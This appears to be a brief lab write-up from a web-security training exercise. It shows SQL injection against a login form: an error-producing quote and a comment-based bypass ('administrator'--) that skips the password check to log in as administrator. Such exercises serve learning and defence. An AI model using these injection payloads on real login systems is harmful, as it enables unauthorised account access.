# Lab 2

## SQL injection - Login functionality

**End Goal**: perform SQLi attack and log in as the administrator user.

**Analysis**

> SELECT * FROM users WHERE  username='admin' AND password='admin'

This causes internal server error

> SELECT * FROM users WHERE  username=''' AND password='admin'

> SELECT * FROM users WHERE  username='admin'--' AND password='admin'

> SELECT * FROM users WHERE  username='administrator'--' AND password='admin'
